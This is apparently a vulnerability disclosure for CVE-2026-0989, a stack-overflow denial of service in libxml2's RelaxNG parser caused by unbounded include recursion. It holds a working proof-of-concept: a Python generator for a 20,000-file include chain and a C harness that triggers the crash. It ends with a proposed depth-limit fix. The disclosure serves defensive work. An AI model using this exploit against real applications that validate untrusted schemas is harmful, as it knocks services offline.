(CVE-2026-0989) Deep RelaxNG Include Causes Stack Overflow (DoS)

Summary

The libxml2 RelaxNG parser does not limit the recursion depth when resolving <include> directives. A malicious or overly complex RelaxNG schema file with a large linear chain of inclusions (e.g., File A includes File B, which includes File C, and so on) causes the parsing process to exhaust the system's call stack, resulting in a Stack Overflow and an application crash.

This vulnerability can be exploited to cause a Denial of Service (DoS) in any application that uses libxml2 to validate XML documents against external RelaxNG schemas.

Poc

We can use a Python script to generate multiple files.

import os
def generate_nested_rng(depth, output_dir="nested_rng"):
    os.makedirs(output_dir, exist_ok=True)
    
    for i in range(1, depth + 1):
        filename = os.path.join(output_dir, f"file{i}.rng")
        
        if i < depth:
            next_file = f"file{i+1}.rng"
            content = f'''<?xml version="1.0" encoding="UTF-8"?>
<grammar xmlns="http://relaxng.org/ns/structure/1.0">
    <include href="{next_file}"/>
</grammar>
'''
        else:
            content = f'''<?xml version="1.0" encoding="UTF-8"?>
<grammar xmlns="http://relaxng.org/ns/structure/1.0">
    <start>
        <element name="root">
            <empty/>
        </element>
    </start>
</grammar>
'''   
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
    
    print(f'generated {depth} nested RelaxNG files, entry file: {os.path.join(output_dir, "file1.rng")}')

if __name__ == "__main__":
    generate_nested_rng(20000) # maybe more than 20000 depending on your system's limits

Then we call an API to parse the RelaxNG schema.

#include <libxml/relaxng.h>

int main(void) {
    // init
    xmlInitParser();
    
    // create parser context for the top-level RelaxNG file
    xmlRelaxNGParserCtxtPtr ctxt = xmlRelaxNGNewParserCtxt("nested_rng/file1.rng");
    if (!ctxt) return 1;
    
    // parse the RelaxNG schema
    xmlRelaxNGPtr rng = xmlRelaxNGParse(ctxt);
    
    // cleanup
    xmlRelaxNGFree(rng);
    xmlRelaxNGFreeParserCtxt(ctxt);
    xmlCleanupParser();
    
    return 0;
}

Suggestion Fix

To mitigate this issue, I propose implementing a hard limit on the nesting depth within the parser.

For example:

Introduce a counter to track the current recursion depth during the inclusion process (e.g., in xmlRelaxNGLoadInclude).

If this depth exceeds a reasonable, predefined limit (e.g., 1000), the parser should report an appropriate error message and immediately terminate the parsing process, thus preventing the Stack Overflow and subsequent application crash.
